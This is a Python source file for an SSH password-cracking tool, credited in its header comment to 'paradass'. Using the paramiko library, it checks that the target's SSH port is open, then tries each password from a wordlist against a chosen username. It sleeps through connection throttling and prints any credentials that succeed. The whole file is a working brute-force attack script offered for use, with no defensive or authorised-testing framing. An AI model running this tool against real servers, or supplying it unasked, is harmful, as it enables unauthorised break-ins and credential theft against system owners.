#Basic shh cracker with python by Burak "paradass" Görez

import time
import socket
import logging
import paramiko
import argparse

class Cracker:
    def __init__(self):
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    @staticmethod
    def parse():
        parser = argparse.ArgumentParser(description="Paramiko ssh cracker by paradass",add_help=False)
        parser.add_argument("-t","--target",required=True,type=str)
        parser.add_argument("-u","--username",required=True,type=str)
        parser.add_argument("-p","--port",required=False,default="22",type=int)
        parser.add_argument("-s","--sleep_time",required=False,default=30,type=int)
        parser.add_argument("-w","--wordlist",required=False,default="wordlist.txt",type=str)
        args = parser.parse_args()
        return args
    
    @staticmethod
    def port_control(args):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as client_socket:
            result = client_socket.connect_ex((args.target,args.port))
            if result == 0:
                print("\033[1mCracking..\033[0m")
                return True
            else:
                print(f"\033[31m{args.target}:{args.port} is not open!\033[0m")
                return False
    
    @staticmethod
    def try_login(args,password:str,client:paramiko.SSHClient):
        try:
            client.connect(args.target,args.port,args.username,password)
            print(f"\033[32m{args.target}:{args.port} for username:\033[34m{args.username}\033[32m and password:\033[34m{password}\033[0m")
            return 0
        except paramiko.AuthenticationException as e:
            print(f"\033[31m{args.username}:{password} {e}\033[0m")
            return 1
        except paramiko.ssh_exception.SSHException as e:
            print(f"\033[31m{e}\033[0m")
            print(f"\033[1mWaiting {args.sleep_time} second for timeout..\033[0m")
            time.sleep(args.sleep_time)
            return 2
        
    def crack(self):
        args = self.parse()
        is_port_open = self.port_control(args)
        if is_port_open == False: return

        with open(args.wordlist,"r") as file:
            lines = file.readlines()
            i = 0
            try:
                while i < len(lines):
                    line = lines[i]
                    line = line.strip()
                    with paramiko.SSHClient() as client:
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        result = self.try_login(args,line,client)
                        if result == 0:
                            return
                        elif result == 1:
                            i += 1
            except KeyboardInterrupt:
                print(f"\033[35mStopping for keyboard interrupt\033[0m")
            except Exception as e:
                print(f"\033[1m{e}\033[0m")

cracker = Cracker()
cracker.crack()